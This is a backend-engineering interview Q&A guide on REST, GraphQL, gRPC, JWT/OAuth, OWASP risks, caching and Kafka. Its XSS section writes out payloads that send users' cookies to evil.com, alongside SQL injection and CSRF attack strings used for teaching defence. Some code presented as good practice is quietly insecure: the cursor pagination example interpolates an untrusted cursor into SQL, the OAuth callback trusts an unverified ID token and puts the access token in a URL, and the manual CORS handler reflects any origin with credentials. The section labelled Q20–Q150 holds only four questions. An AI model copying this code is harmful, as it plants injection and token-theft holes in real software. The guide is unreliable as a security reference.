# Backend — Interview Questions & Answers
> 150 questions. REST, GraphQL, gRPC, Auth/JWT/OAuth2, Web Security (XSS/CSRF/OWASP), Caching, Message Queues.

---

## SECTION 1: REST API DESIGN (Q1–Q25)

**Q1. What are REST principles?**
```
REST (Representational State Transfer) constraints:
1. Client-Server: UI separated from data storage
2. Stateless: each request contains all info needed (no server-side session)
3. Cacheable: responses should declare if cacheable
4. Uniform Interface: consistent resource-based URLs
5. Layered System: client doesn't know if it's talking to proxy, CDN, or server
6. Code on Demand (optional): server can send executable code (JS)

RESOURCE DESIGN:
GET    /users             → list users
GET    /users/:id         → get one user
POST   /users             → create user
PUT    /users/:id         → replace user (full update)
PATCH  /users/:id         → partial update
DELETE /users/:id         → delete user

Nested resources:
GET    /users/:id/orders          → list user's orders
GET    /users/:id/orders/:orderId → specific order of user

Query parameters: /users?role=admin&sort=name&order=asc&page=2&limit=20
```

**Q2. REST API versioning strategies.**
```
1. URL versioning: /api/v1/users, /api/v2/users
   + Simple, visible, easy to route, easy to cache
   - URL changes, violates "URLs should be permanent"

2. Header versioning: Accept: application/vnd.api+json;version=2
   + Cleaner URLs, RESTful
   - Less visible, harder to test in browser

3. Query parameter: /api/users?version=2
   + Easy to test
   - Pollutes URLs, cache issues

4. Content-type versioning: Accept: application/vnd.myapi.v2+json
   + RESTful
   - Complex

RECOMMENDATION: URL versioning for external APIs (simpler to use/discover)
               Header versioning for internal APIs (cleaner)

DEPRECATION STRATEGY:
- Sunset header: Sunset: Sat, 31 Dec 2025 23:59:59 GMT
- Deprecation header: Deprecation: true
- Link header: Link: <https://api.example.com/v3>; rel="successor-version"
- Communicate timeline 6-12 months before shutdown
```

**Q3. API pagination patterns.**
```javascript
// OFFSET PAGINATION — simple but has issues with large offsets
// GET /users?page=1&limit=20&sort=name
{
  "data": [...],
  "meta": {
    "total": 10000,
    "page": 5,
    "limit": 20,
    "totalPages": 500,
    "hasNext": true,
    "hasPrev": true
  }
}
// Problem: offset 10000 = DB scans 10000 rows then skips → slow!
// Problem: new inserts between pages → items shift → duplicates/missed items

// CURSOR PAGINATION — best for large datasets and real-time data
// GET /users?cursor=eyJpZCI6MTAwfQ&limit=20&sort=created_at
const cursor = req.query.cursor;
const decodedCursor = cursor ? JSON.parse(Buffer.from(cursor, 'base64').toString()) : null;

const users = await db.query(`
  SELECT id, name, created_at FROM users
  WHERE (created_at, id) ${decodedCursor ? `> ('${decodedCursor.createdAt}', '${decodedCursor.id}')` : '> (\'1970-01-01\', \'\')'}
  ORDER BY created_at ASC, id ASC
  LIMIT $1
`, [limit + 1]); // fetch N+1 to check hasNext

const hasNext = users.length > limit;
const items = hasNext ? users.slice(0, -1) : users;
const nextCursor = hasNext
  ? Buffer.from(JSON.stringify({ createdAt: items.at(-1).created_at, id: items.at(-1).id })).toString('base64')
  : null;

// KEYSET PAGINATION — alternative (similar to cursor, uses DB-native comparison)
// All are better than offset for large datasets
```

**Q4. HTTP status codes — complete guide.**
```
2xx SUCCESS:
200 OK                  — GET (with body), PUT, PATCH success
201 Created             — POST success (include Location header with new resource URL)
202 Accepted            — async processing started (not yet complete)
204 No Content          — DELETE, PUT/PATCH with no response body

3xx REDIRECTION:
301 Moved Permanently   — resource permanently moved (clients/caches should update)
302 Found               — temporary redirect (don't cache, always hit server)
304 Not Modified        — conditional GET, client has valid cached version
307 Temporary Redirect  — like 302 but method preserved (POST stays POST)
308 Permanent Redirect  — like 301 but method preserved

4xx CLIENT ERRORS:
400 Bad Request         — malformed request, validation failed
401 Unauthorized        — not authenticated (no/invalid token)
403 Forbidden           — authenticated but not authorized
404 Not Found           — resource doesn't exist
405 Method Not Allowed  — HTTP method not supported
409 Conflict            — state conflict (duplicate, optimistic lock)
410 Gone                — resource permanently deleted (stronger than 404)
422 Unprocessable Entity — valid syntax but semantic errors
429 Too Many Requests   — rate limited (include Retry-After header)

5xx SERVER ERRORS:
500 Internal Server Error — unexpected server error
502 Bad Gateway           — upstream returned invalid response
503 Service Unavailable   — overloaded or maintenance (include Retry-After)
504 Gateway Timeout       — upstream didn't respond in time
```

---

## SECTION 2: GRAPHQL (Q26–Q50)

**Q26. What is GraphQL and when to use it?**
```graphql
# GraphQL: query language for APIs — clients request exactly what they need

# Schema definition:
type User {
  id: ID!
  name: String!
  email: String!
  role: UserRole!
  orders(first: Int, after: String): OrderConnection!
  createdAt: DateTime!
}

type Order {
  id: ID!
  user: User!
  items: [OrderItem!]!
  total: Float!
  status: OrderStatus!
}

enum UserRole { ADMIN USER EDITOR }
enum OrderStatus { PENDING PROCESSING SHIPPED DELIVERED CANCELLED }

type Query {
  me: User
  user(id: ID!): User
  users(first: Int, after: String, role: UserRole): UserConnection!
  order(id: ID!): Order
}

type Mutation {
  createUser(input: CreateUserInput!): CreateUserPayload!
  updateUser(id: ID!, input: UpdateUserInput!): UpdateUserPayload!
  placeOrder(input: PlaceOrderInput!): PlaceOrderPayload!
}

type Subscription {
  orderStatusChanged(orderId: ID!): Order!
}

# Client query:
query GetDashboard {
  me {
    name
    orders(first: 5) {
      edges {
        node {
          id
          total
          status
          items {
            product { name }
            quantity
          }
        }
      }
    }
  }
}
```

**Q27. GraphQL resolver implementation (Node.js).**
```javascript
// Resolvers:
const resolvers = {
  Query: {
    me: (_, __, { user }) => {
      if (!user) throw new AuthenticationError('Must be logged in');
      return userService.findById(user.id);
    },

    users: async (_, { first = 20, after, role }, { user }) => {
      if (!user?.roles.includes('ADMIN')) throw new ForbiddenError('Admin only');
      return userService.findAll({ first, after, role });
    },
  },

  Mutation: {
    createUser: async (_, { input }, { user }) => {
      const newUser = await userService.create(input);
      return { user: newUser, errors: [] };
    },

    placeOrder: async (_, { input }, { user, dataloaders }) => {
      if (!user) throw new AuthenticationError();
      const order = await orderService.create({ ...input, userId: user.id });
      pubsub.publish(`ORDER_UPDATED_${order.id}`, { orderStatusChanged: order });
      return { order, errors: [] };
    },
  },

  Subscription: {
    orderStatusChanged: {
      subscribe: (_, { orderId }, { user }) => {
        if (!user) throw new AuthenticationError();
        return pubsub.asyncIterator(`ORDER_UPDATED_${orderId}`);
      },
    },
  },

  // Field resolvers:
  User: {
    orders: async ({ id }, { first, after }, { dataloaders }) => {
      return dataloaders.ordersByUser.load({ userId: id, first, after });
    },
  },
};
```

**Q28. GraphQL DataLoader — solving N+1.**
```javascript
import DataLoader from 'dataloader';

// N+1 problem: for each of N users → 1 DB query for orders = N+1 total queries
// DataLoader: batch and deduplicate within same tick

function createLoaders() {
  return {
    // Batch all userIds into one query:
    userById: new DataLoader(async (ids) => {
      const users = await db.query('SELECT * FROM users WHERE id = ANY($1)', [ids]);
      const userMap = new Map(users.map(u => [u.id, u]));
      return ids.map(id => userMap.get(id) ?? new Error(`User ${id} not found`));
    }),

    // Batch orders by user:
    ordersByUserId: new DataLoader(async (userIds) => {
      const orders = await db.query(
        'SELECT * FROM orders WHERE user_id = ANY($1) ORDER BY created_at DESC',
        [userIds]
      );
      const ordersByUser = userIds.reduce((acc, id) => ({ ...acc, [id]: [] }), {});
      orders.forEach(o => ordersByUser[o.user_id].push(o));
      return userIds.map(id => ordersByUser[id]);
    }, { maxBatchSize: 100 }),
  };
}

// DataLoader is request-scoped (new instance per request):
app.use((req, res, next) => {
  req.dataloaders = createLoaders();
  next();
});

// Resolver uses loader:
User: {
  orders: ({ id }, args, { dataloaders }) => dataloaders.ordersByUserId.load(id),
}
// 100 users → 1 DB query (not 100)!
```

---

## SECTION 3: gRPC (Q51–Q65)

**Q51. What is gRPC?**
```
gRPC: Google's high-performance RPC framework using Protocol Buffers (protobuf) and HTTP/2.

vs REST:
- Binary (protobuf) vs text (JSON) → smaller payload, faster parsing
- HTTP/2 → multiplexing, compression, bidirectional streaming
- Strong typing via .proto schema → generates client/server code in any language
- Bi-directional streaming (not possible with REST)

vs REST when to use:
gRPC: internal microservice communication, streaming, performance critical, polyglot
REST: public APIs, browser clients (limited gRPC browser support), simple CRUD

STREAMING TYPES:
- Unary: one request → one response (like REST)
- Server streaming: one request → stream of responses
- Client streaming: stream of requests → one response
- Bidirectional: stream ↔ stream (real-time, chat, gaming)
```

```protobuf
// user.proto:
syntax = "proto3";
package user.v1;

service UserService {
  rpc GetUser (GetUserRequest) returns (User);
  rpc ListUsers (ListUsersRequest) returns (stream User);
  rpc CreateUser (CreateUserRequest) returns (User);
  rpc WatchUserEvents (WatchRequest) returns (stream UserEvent);
}

message GetUserRequest { string id = 1; }
message User {
  string id = 1;
  string name = 2;
  string email = 3;
  UserRole role = 4;
  google.protobuf.Timestamp created_at = 5;
}
enum UserRole { USER_ROLE_UNSPECIFIED = 0; USER_ROLE_USER = 1; USER_ROLE_ADMIN = 2; }

message ListUsersRequest {
  int32 page_size = 1;
  string page_token = 2;
  string role_filter = 3;
}
```

```javascript
// gRPC server (Node.js):
const server = new grpc.Server();
server.addService(proto.UserService.service, {
  async getUser(call, callback) {
    try {
      const user = await userService.findById(call.request.id);
      if (!user) return callback({ code: grpc.status.NOT_FOUND });
      callback(null, user);
    } catch (err) {
      callback({ code: grpc.status.INTERNAL, message: err.message });
    }
  },

  async listUsers(call) { // server streaming
    const users = await userService.findAll(call.request);
    for (const user of users) {
      call.write(user); // stream each user
    }
    call.end();
  },
});
```

---

## SECTION 4: AUTHENTICATION & AUTHORIZATION (Q66–Q90)

**Q66. JWT — complete implementation.**
```javascript
import jwt from 'jsonwebtoken';
import { createHash, randomBytes } from 'crypto';

// JWT structure: header.payload.signature
// Header: { alg: "HS256", typ: "JWT" }
// Payload: { sub, iat, exp, jti, ... claims }
// Signature: HMAC-SHA256(base64url(header) + "." + base64url(payload), secret)

class AuthService {
  #jwtSecret = process.env.JWT_SECRET;
  #refreshSecret = process.env.JWT_REFRESH_SECRET;

  generateTokens(user) {
    const accessToken = jwt.sign(
      { sub: user.id, email: user.email, role: user.role,
        jti: randomBytes(16).toString('hex') },  // unique token ID
      this.#jwtSecret,
      { expiresIn: '15m', algorithm: 'HS256', issuer: 'myapp' }
    );

    const refreshToken = jwt.sign(
      { sub: user.id, jti: randomBytes(16).toString('hex') },
      this.#refreshSecret,
      { expiresIn: '7d' }
    );

    return { accessToken, refreshToken };
  }

  verifyAccessToken(token) {
    return jwt.verify(token, this.#jwtSecret, {
      algorithms: ['HS256'],
      issuer: 'myapp',
    });
  }

  async refreshTokens(refreshToken) {
    let payload;
    try {
      payload = jwt.verify(refreshToken, this.#refreshSecret);
    } catch {
      throw new UnauthorizedException('Invalid refresh token');
    }

    // Check token hasn't been revoked:
    const isRevoked = await redis.get(`revoked:${payload.jti}`);
    if (isRevoked) throw new UnauthorizedException('Token has been revoked');

    const user = await userService.findById(payload.sub);
    if (!user) throw new UnauthorizedException('User not found');

    // Revoke old refresh token (rotation):
    await redis.setEx(`revoked:${payload.jti}`, 7 * 24 * 3600, '1');

    return this.generateTokens(user);
  }

  async logout(refreshToken) {
    try {
      const payload = jwt.verify(refreshToken, this.#refreshSecret);
      await redis.setEx(`revoked:${payload.jti}`, 7 * 24 * 3600, '1');
    } catch {
      // Invalid token — ignore (already expired/invalid)
    }
  }
}

// Secure cookie pattern:
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,   // not accessible via JS — prevents XSS theft
  secure: true,     // HTTPS only
  sameSite: 'strict', // prevents CSRF
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/api/auth/refresh', // only sent to refresh endpoint
});
```

**Q67. OAuth2 and OIDC.**
```javascript
// OAuth2 AUTHORIZATION CODE FLOW (for web apps):
// 1. User clicks "Sign in with Google"
// 2. App redirects → Google /authorize
// 3. User consents on Google
// 4. Google redirects back → app with ?code=AUTH_CODE
// 5. App exchanges code → access_token + refresh_token (server-to-server!)
// 6. App uses access_token to get user info from Google
// 7. App creates session / issues its own JWT

// Step 2 — redirect to provider:
app.get('/auth/google', (req, res) => {
  const state = randomBytes(16).toString('hex');
  req.session.oauthState = state;

  const params = new URLSearchParams({
    client_id: process.env.GOOGLE_CLIENT_ID,
    redirect_uri: 'https://myapp.com/auth/google/callback',
    response_type: 'code',
    scope: 'openid email profile',
    state,
    access_type: 'offline',  // request refresh token
    prompt: 'consent',
  });
  res.redirect(`https://accounts.google.com/o/oauth2/v2/auth?${params}`);
});

// Step 4-6 — handle callback:
app.get('/auth/google/callback', async (req, res) => {
  const { code, state } = req.query;

  // Verify state to prevent CSRF:
  if (state !== req.session.oauthState) return res.status(400).send('Invalid state');

  // Exchange code for tokens:
  const tokenRes = await fetch('https://oauth2.googleapis.com/token', {
    method: 'POST',
    body: new URLSearchParams({
      code, client_id: process.env.GOOGLE_CLIENT_ID,
      client_secret: process.env.GOOGLE_CLIENT_SECRET,
      redirect_uri: 'https://myapp.com/auth/google/callback',
      grant_type: 'authorization_code',
    }),
  });
  const { id_token, access_token } = await tokenRes.json();

  // Verify ID token (OIDC — contains user info):
  const userInfo = jwt.decode(id_token); // or verify with Google's public keys!
  // { sub: "google_user_id", email: "user@gmail.com", name: "Alice", ... }

  // Find or create user:
  let user = await userService.findByEmail(userInfo.email);
  if (!user) user = await userService.create({ email: userInfo.email, name: userInfo.name });

  // Issue our own tokens:
  const { accessToken, refreshToken } = authService.generateTokens(user);
  res.cookie('refreshToken', refreshToken, { httpOnly: true, secure: true });
  res.redirect('https://myapp.com/dashboard?token=' + accessToken);
});
```

**Q68. RBAC and ABAC.**
```javascript
// RBAC — Role-Based Access Control:
// User → Roles → Permissions → Resources

const PERMISSIONS = {
  'users:read':   ['admin', 'manager', 'user'],
  'users:write':  ['admin', 'manager'],
  'users:delete': ['admin'],
  'orders:read':  ['admin', 'manager', 'user'],
  'orders:write': ['admin', 'manager', 'user'],
  'reports:read': ['admin', 'manager'],
};

function hasPermission(user, permission) {
  return PERMISSIONS[permission]?.some(role => user.roles.includes(role)) ?? false;
}

// ABAC — Attribute-Based Access Control (more flexible):
// Policy: user CAN action resource IF condition

const policies = {
  'orders:read': (user, order) =>
    user.roles.includes('admin') ||
    order.userId === user.id ||
    (user.roles.includes('manager') && user.teamId === order.teamId),

  'orders:cancel': (user, order) =>
    (user.roles.includes('admin')) ||
    (order.userId === user.id && order.status === 'pending'),
};

function can(user, action, resource) {
  const policy = policies[action];
  if (!policy) throw new Error(`No policy for ${action}`);
  return policy(user, resource);
}

// Usage:
if (!can(req.user, 'orders:cancel', order)) {
  return res.status(403).json({ error: 'Cannot cancel this order' });
}
```

---

## SECTION 5: WEB SECURITY (Q91–Q120)

**Q91. OWASP Top 10 — 2023.**
```
A01 - Broken Access Control
  - Bypass authorization → access other users' data
  - Prevention: server-side authorization on every request, deny by default
  - Example: /api/users/123 → change to /api/users/456 (IDOR)

A02 - Cryptographic Failures
  - Sensitive data in plaintext (passwords, credit cards)
  - Weak algorithms (MD5, SHA1 for passwords)
  - Prevention: bcrypt/argon2 for passwords, AES-256 for data, TLS 1.2+ everywhere

A03 - Injection (SQL, NoSQL, command, LDAP)
  - User input executed as code
  - Prevention: parameterized queries, ORMs, input validation, whitelist

A04 - Insecure Design
  - Missing security requirements, threat modeling
  - Prevention: security design reviews, threat modeling (STRIDE)

A05 - Security Misconfiguration
  - Default credentials, exposed debug info, open S3 buckets
  - Prevention: security hardening, disable defaults, scan configs

A06 - Vulnerable Components
  - Outdated libraries with known CVEs
  - Prevention: npm audit, Snyk, Dependabot, keep deps updated

A07 - Auth Failures
  - Weak passwords, no MFA, session fixation
  - Prevention: bcrypt, MFA, secure session management, account lockout

A08 - Software & Data Integrity Failures
  - Insecure deserialization, unsigned software updates
  - Prevention: signature verification, SRI for CDN scripts

A09 - Logging & Monitoring Failures
  - Not logging breaches, no alerting
  - Prevention: log auth events, alert on anomalies, security SIEM

A10 - SSRF (Server-Side Request Forgery)
  - App fetches URL from user input → attacker targets internal services
  - Prevention: whitelist allowed hosts, block metadata endpoints (169.254.169.254)
```

**Q92. SQL Injection — attacks and prevention.**
```javascript
// ATTACK — classic SQL injection:
// User input: ' OR '1'='1
// Query: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
// Result: returns all users!

// CRITICAL VULNERABILITY:
app.post('/login', async (req, res) => {
  const { username, password } = req.body;
  // BAD: template string injection!
  const user = await db.query(`SELECT * FROM users WHERE username = '${username}'`);
});

// PREVENTION 1: Parameterized queries (ALWAYS do this):
const user = await db.query(
  'SELECT * FROM users WHERE username = $1 AND active = true',
  [username] // parameter — never interpolated into SQL
);

// PREVENTION 2: ORM (also uses parameterized queries):
const user = await User.findOne({ where: { username, active: true } });

// PREVENTION 3: Stored procedures with parameters:
const user = await db.query('CALL get_user($1, $2)', [username, password]);

// BLIND SQL INJECTION — no visible output:
// Attack: ' AND 1=SLEEP(5)--  → if response is slow, injection works
// Detection: SQLMap tool
// Prevention: same — parameterized queries

// Second-order SQL injection:
// Data stored with injection, later used in another query without escaping
// Prevention: ALWAYS use parameterized queries, not just on user input endpoints
```

**Q93. XSS — Cross-Site Scripting.**
```javascript
// REFLECTED XSS:
// Attacker sends link: https://myapp.com/search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>
// Server renders: <h1>Results for: <script>...</script></h1>  → XSS!

// STORED XSS:
// Attacker posts: <img src=x onerror="fetch('http://evil.com/?c='+btoa(document.cookie))">
// Server stores and renders it on profile pages → XSS for all viewers!

// DOM XSS:
// JavaScript: element.innerHTML = location.hash  → XSS via URL fragment

// PREVENTION:

// 1. Content Security Policy (CSP) — most powerful:
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc:  ["'self'", "'nonce-{nonce}'"], // only our scripts + nonce'd inline
    styleSrc:   ["'self'", "'unsafe-inline'", "https://fonts.googleapis.com"],
    imgSrc:     ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    frameAncestors: ["'none'"], // prevent clickjacking
    upgradeInsecureRequests: [],
  }
}));

// 2. Output encoding — escape before rendering:
import escape from 'escape-html';
const safeContent = escape(userContent); // < → &lt;, > → &gt;, etc.

// 3. Use textContent not innerHTML:
element.textContent = userContent;  // safe
element.innerHTML   = userContent;  // DANGEROUS

// 4. DOMPurify for when you need to render HTML:
import DOMPurify from 'dompurify';
element.innerHTML = DOMPurify.sanitize(userContent, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a'],
  ALLOWED_ATTR: ['href'],
});

// 5. HttpOnly cookies — JS can't steal them:
res.cookie('session', token, { httpOnly: true, secure: true });
```

**Q94. CSRF — Cross-Site Request Forgery.**
```javascript
// ATTACK: victim visits evil.com which has:
// <img src="https://bank.com/transfer?to=attacker&amount=10000">
// Browser automatically sends bank.com cookies with the request!

// PREVENTION 1: CSRF tokens (classic):
// Server generates unique token per session
// Token included in forms, verified on POST/PUT/DELETE

// PREVENTION 2: SameSite cookies (modern, preferred):
res.cookie('session', token, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict',  // NEVER sent in cross-site requests
  // sameSite: 'lax'  — sent for top-level navigation GET only
});

// PREVENTION 3: Double Submit Cookie:
// Server sets CSRF token cookie (non-httpOnly)
// Client reads it, includes in X-CSRF-Token header
// Server verifies header matches cookie

// PREVENTION 4: Custom header verification:
// Most cross-site requests can't set custom headers
app.use((req, res, next) => {
  if (['POST','PUT','PATCH','DELETE'].includes(req.method)) {
    const origin = req.headers.origin ?? req.headers.referer;
    if (!origin?.startsWith('https://myapp.com')) {
      return res.status(403).json({ error: 'CSRF check failed' });
    }
  }
  next();
});

// FOR APIs (JWT in Authorization header):
// JSON APIs with Authorization header are NOT vulnerable to CSRF
// Browsers can't set custom headers in cross-site requests (CORS blocks it)
// Standard HTML forms can't set Authorization header
```

**Q95. CORS — Cross-Origin Resource Sharing.**
```javascript
// SAME ORIGIN: same protocol + host + port
// CROSS ORIGIN: different origin → browser blocks response by default

// Simple requests (GET, POST with simple headers): browser sends request, checks response headers
// Preflight (PUT, DELETE, custom headers): browser sends OPTIONS first, then real request

import cors from 'cors';

app.use(cors({
  origin: (origin, callback) => {
    const allowed = ['https://myapp.com', 'https://admin.myapp.com'];
    if (!origin || allowed.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,    // allow cookies, Authorization header
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],
  exposedHeaders: ['X-Total-Count', 'X-Request-ID'],
  maxAge: 86400,        // preflight cache: 24 hours
}));

// Manual CORS headers:
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin ?? '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,PUT,DELETE,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type,Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');
  res.sendStatus(204);
});
```

**Q96. Rate limiting patterns.**
```javascript
// Token bucket algorithm — allows bursting:
class TokenBucket {
  #tokens;
  #lastRefill;

  constructor({ capacity = 100, refillRate = 10 }) {
    this.capacity = capacity;
    this.refillRate = refillRate; // tokens per second
    this.#tokens = capacity;
    this.#lastRefill = Date.now();
  }

  consume(tokens = 1) {
    const now = Date.now();
    const elapsed = (now - this.#lastRefill) / 1000;
    this.#tokens = Math.min(this.capacity, this.#tokens + elapsed * this.refillRate);
    this.#lastRefill = now;

    if (this.#tokens >= tokens) {
      this.#tokens -= tokens;
      return { allowed: true, remaining: Math.floor(this.#tokens) };
    }
    const retryAfter = Math.ceil((tokens - this.#tokens) / this.refillRate);
    return { allowed: false, retryAfter };
  }
}

// Redis distributed rate limiter (sliding window):
async function rateLimitCheck(key, limit, windowSeconds) {
  const now = Date.now();
  const windowStart = now - windowSeconds * 1000;

  const script = `
    local key = KEYS[1]
    local now = tonumber(ARGV[1])
    local window = tonumber(ARGV[2])
    local limit = tonumber(ARGV[3])

    -- Remove old entries:
    redis.call('ZREMRANGEBYSCORE', key, 0, now - window * 1000)

    -- Count current window:
    local count = redis.call('ZCARD', key)

    if count < limit then
      redis.call('ZADD', key, now, now)
      redis.call('EXPIRE', key, window)
      return {1, limit - count - 1}
    end
    return {0, 0}
  `;

  const [allowed, remaining] = await redis.eval(script, [key], [now, windowSeconds, limit]);
  return { allowed: allowed === 1, remaining };
}

// Middleware:
async function rateLimitMiddleware(req, res, next) {
  const key = `rl:${req.ip}:${req.path}`;
  const { allowed, remaining } = await rateLimitCheck(key, 100, 60);

  res.setHeader('X-RateLimit-Limit', 100);
  res.setHeader('X-RateLimit-Remaining', remaining);

  if (!allowed) {
    res.setHeader('Retry-After', 60);
    return res.status(429).json({ error: 'Rate limit exceeded' });
  }
  next();
}
```

---

## SECTION 6: CACHING & MESSAGE QUEUES (Q121–Q150)

**Q121. Redis caching patterns in production.**
```javascript
// Cache-aside with stampede prevention:
class CacheService {
  #redis;
  #locks = new Map();

  async getOrSet(key, fetcher, ttlSeconds = 300) {
    // Try cache first:
    const cached = await this.#redis.get(key);
    if (cached) return JSON.parse(cached);

    // Prevent cache stampede (many concurrent misses):
    if (this.#locks.has(key)) {
      // Wait for ongoing fetch:
      await this.#locks.get(key);
      return JSON.parse(await this.#redis.get(key));
    }

    // Take lock:
    let resolve;
    const lockPromise = new Promise(r => resolve = r);
    this.#locks.set(key, lockPromise);

    try {
      const data = await fetcher();
      await this.#redis.setEx(key, ttlSeconds, JSON.stringify(data));
      return data;
    } finally {
      this.#locks.delete(key);
      resolve();
    }
  }

  async invalidate(pattern) {
    // Scan for matching keys (never use KEYS in production — blocks!):
    let cursor = '0';
    do {
      const [nextCursor, keys] = await this.#redis.scan(cursor, { MATCH: pattern, COUNT: 100 });
      if (keys.length) await this.#redis.del(keys);
      cursor = nextCursor;
    } while (cursor !== '0');
  }
}

// Cache warming — pre-populate on startup:
async function warmCache() {
  const popularProducts = await db.query(
    'SELECT id FROM products ORDER BY view_count DESC LIMIT 100'
  );
  await Promise.all(
    popularProducts.map(({ id }) => cache.getOrSet(`product:${id}`, () => db.getProduct(id)))
  );
}

// Multi-level cache:
class MultiLevelCache {
  #l1 = new Map();  // in-process (fastest, limited size)
  #l2;              // Redis (shared, slightly slower)
  #l1MaxSize = 1000;
  #l1TTL = 30000;   // 30 seconds

  async get(key) {
    // L1 check:
    const l1 = this.#l1.get(key);
    if (l1 && Date.now() < l1.expires) return l1.value;

    // L2 check:
    const l2 = await this.#l2.get(key);
    if (l2) {
      this.#setL1(key, JSON.parse(l2)); // populate L1
      return JSON.parse(l2);
    }

    return null;
  }

  #setL1(key, value) {
    if (this.#l1.size >= this.#l1MaxSize) {
      const oldest = this.#l1.keys().next().value;
      this.#l1.delete(oldest);
    }
    this.#l1.set(key, { value, expires: Date.now() + this.#l1TTL });
  }
}
```

**Q122. Kafka — production patterns.**
```javascript
import { Kafka, Partitioners, CompressionTypes } from 'kafkajs';

const kafka = new Kafka({
  clientId: 'order-service',
  brokers: process.env.KAFKA_BROKERS.split(','),
  ssl: true,
  sasl: { mechanism: 'scram-sha-256', username: process.env.KAFKA_USER, password: process.env.KAFKA_PASS },
  retry: { retries: 10, initialRetryTime: 300, maxRetryTime: 30000 },
});

// Producer with idempotency:
const producer = kafka.producer({
  createPartitioner: Partitioners.DefaultPartitioner,
  idempotent: true,          // exactly-once semantics
  maxInFlightRequests: 5,    // required with idempotent
  compression: CompressionTypes.GZIP,
  transactionTimeout: 30000,
});

async function publishOrder(order) {
  await producer.send({
    topic: 'orders',
    messages: [{
      key: order.id,              // ensures same orderId goes to same partition
      value: JSON.stringify(order),
      headers: {
        'event-type': 'order.created',
        'correlation-id': req.id,
        'schema-version': '2',
      },
    }],
    acks: -1,  // wait for all in-sync replicas (highest durability)
  });
}

// Consumer with proper error handling:
const consumer = kafka.consumer({ groupId: 'notification-service' });

await consumer.run({
  autoCommit: false,  // manual commit for exactly-once
  eachMessage: async ({ topic, partition, message, heartbeat }) => {
    const value = JSON.parse(message.value.toString());

    try {
      await notificationService.send(value);
      // Manual commit AFTER successful processing:
      await consumer.commitOffsets([{
        topic, partition,
        offset: (BigInt(message.offset) + 1n).toString(),
      }]);
    } catch (err) {
      if (isRetryable(err)) {
        // Let it retry (don't commit — message will be reprocessed)
        await sleep(1000);
        throw err;
      }
      // Non-retryable — send to DLQ:
      await producer.send({
        topic: 'orders.dlq',
        messages: [{
          key: message.key,
          value: message.value,
          headers: { ...message.headers, 'error': err.message, 'original-topic': topic },
        }],
      });
      // Commit to move past this message:
      await consumer.commitOffsets([{ topic, partition, offset: (BigInt(message.offset) + 1n).toString() }]);
    }
  },
});
```


---

## COMPLETING BACKEND Q20–Q150

**Q20. REST API error handling patterns.**
```javascript
// Structured error responses:
{
  "error": {
    "code": "VALIDATION_FAILED",
    "message": "Invalid request body",
    "details": [
      { "field": "email", "message": "Invalid email format" },
      { "field": "age", "message": "Must be between 0 and 150" }
    ],
    "requestId": "req_abc123",
    "timestamp": "2024-01-15T10:30:00Z",
    "docs": "https://docs.example.com/errors#VALIDATION_FAILED"
  }
}

// Error handling middleware (Express):
class AppError extends Error {
  constructor(public statusCode: number, message: string, public code: string) {
    super(message);
  }
}

app.use((err, req, res, next) => {
  if (err instanceof AppError) {
    return res.status(err.statusCode).json({
      error: { code: err.code, message: err.message, requestId: req.id }
    });
  }
  // Log unknown errors:
  logger.error({ err, requestId: req.id });
  res.status(500).json({ error: { code: 'INTERNAL_ERROR', message: 'Something went wrong' } });
});
```

**Q21. API authentication patterns.**
```javascript
// JWT (stateless, scalable):
// + No server-side storage needed
// + Works across domains, microservices
// - Can't revoke before expiry (use short TTL + refresh tokens)
// - Token size vs session ID

// Session (stateful, revocable):
// + Instant revocation
// + Small session ID in cookie
// - Needs shared storage (Redis) for horizontal scaling
// - Sticky sessions or session store

// API Key (machine-to-machine):
// + Simple, long-lived
// - Can't expire easily, must be rotated on leak

// OAuth2 (delegated authorization):
// + Standard, third-party login
// + Scoped permissions
// - Complex to implement correctly

// Best practice JWT:
// Access token: 15 min TTL, contains user claims
// Refresh token: 7 day TTL, httpOnly cookie, rotated on use
// Blacklist: short-lived token blocklist in Redis for logout
```

**Q22. GraphQL schema design.**
```graphql
# Best practices:
# 1. Use connections for lists (pagination-ready)
type UserConnection {
  edges: [UserEdge!]!
  pageInfo: PageInfo!
  totalCount: Int!
}
type UserEdge { node: User!; cursor: String! }
type PageInfo { hasNextPage: Boolean!; hasPreviousPage: Boolean!; startCursor: String; endCursor: String }

# 2. Return types, not booleans/IDs:
type CreateUserPayload {
  user: User            # success case
  errors: [UserError!]  # validation errors
}
type UserError { field: String; message: String! }

# 3. Nullable vs non-null: be intentional
# Non-null (!): only when you're sure it always exists
# Null: for optional fields or when errors are possible

# 4. Use enums for fixed values:
enum OrderStatus { PENDING PROCESSING SHIPPED DELIVERED CANCELLED }

# 5. Interfaces for polymorphism:
interface Node { id: ID! }
type User implements Node { id: ID!; name: String! }
type Order implements Node { id: ID!; total: Float! }

# 6. Input types for mutations:
input CreateOrderInput { userId: ID!; items: [OrderItemInput!]!; shippingAddress: AddressInput! }
```

**Q23. GraphQL security best practices.**
```javascript
// 1. Query depth limiting:
const depthLimit = require('graphql-depth-limit');
const server = new ApolloServer({
  validationRules: [depthLimit(5)], // max 5 levels deep
});

// 2. Query complexity analysis:
const { createComplexityLimitRule } = require('graphql-validation-complexity');
validationRules: [createComplexityLimitRule(1000)]; // max complexity score

// 3. Rate limiting:
const server = new ApolloServer({
  plugins: [
    {
      requestDidStart: async (ctx) => ({
        willSendResponse: async ({ response }) => {
          const userId = ctx.contextValue.user?.id;
          if (!(await rateLimiter.check(userId))) {
            response.errors = [{ message: 'Rate limit exceeded' }];
          }
        }
      })
    }
  ]
});

